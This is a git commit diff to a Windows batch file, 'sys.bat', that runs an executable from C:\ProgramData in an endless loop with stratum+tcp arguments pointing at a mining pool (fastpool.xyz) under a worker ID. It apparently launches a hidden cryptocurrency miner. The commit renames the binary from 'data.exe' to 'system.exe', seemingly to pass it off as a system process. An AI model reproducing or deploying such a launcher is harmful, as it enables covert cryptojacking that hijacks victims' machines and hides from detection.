89b3b8940332a57e4328c7b59a399a8d99f2506a
BobbySJohnson <77875776+BobbySJohnson@users.noreply.github.com>
2021-03-04 05:33:54 +0545

    Update sys.bat

--- sys.bat
+++ sys.bat
@@ -2,6 +2,6 @@
 
 :start
 
-  C:\ProgramData\data.exe -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10096 -su 1191499-59.0.sl
+  C:\ProgramData\system.exe -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10096 -su 1191499-59.0.sl
 
 goto start
